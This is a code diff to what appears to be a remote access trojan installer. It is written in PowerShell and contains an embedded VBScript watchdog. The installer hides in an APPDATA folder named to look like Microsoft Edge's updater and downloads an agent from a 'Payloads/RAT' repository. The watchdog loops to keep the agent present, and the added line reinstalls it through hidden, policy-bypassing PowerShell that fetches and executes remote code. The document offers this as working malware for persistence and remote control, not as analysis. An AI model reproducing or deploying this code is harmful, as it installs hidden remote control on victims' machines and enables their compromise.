@@ -4,7 +4,7 @@ $installDir = Join-Path $env:APPDATA "MicrosoftEdgeUpdate"
 $vbsDir = Join-Path $env:APPDATA "Microsoft"
 New-Item -ItemType Directory -Force -Path $installDir
 
-$baseUrl = "https://raw.githubusercontent.com/Red-Ducky/Payloads/maj/RAT/agent/"
+$baseUrl = "https://raw.githubusercontent.com/Red-Ducky/Payloads/maj/RAT/"
 Invoke-WebRequest -Uri ($baseUrl + "agent.ps1") -OutFile (Join-Path $installDir "agent.ps1")
 
 $agentPath = Join-Path $installDir "agent.ps1"
@@ -20,10 +20,8 @@ Do While True
     fileExists = objFSO.FileExists("$agentPath")
 
     If Not fileExists Then
-        If Not objFSO.FolderExists("$installDir") Then
-            objFSO.CreateFolder "$installDir"
-        End If
-        objShell.Run "powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""Invoke-WebRequest -Uri '${baseUrl}agent.ps1' -OutFile '$installDir\agent.ps1'""", 0, False
+        objShell.Run "powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""iex (irm '${baseUrl}install.ps1')""", 0, False
+        WScript.Quit
     End If
     
     Set processes = objWMI.ExecQuery("SELECT * FROM Win32_Process WHERE Name = 'powershell.exe'")
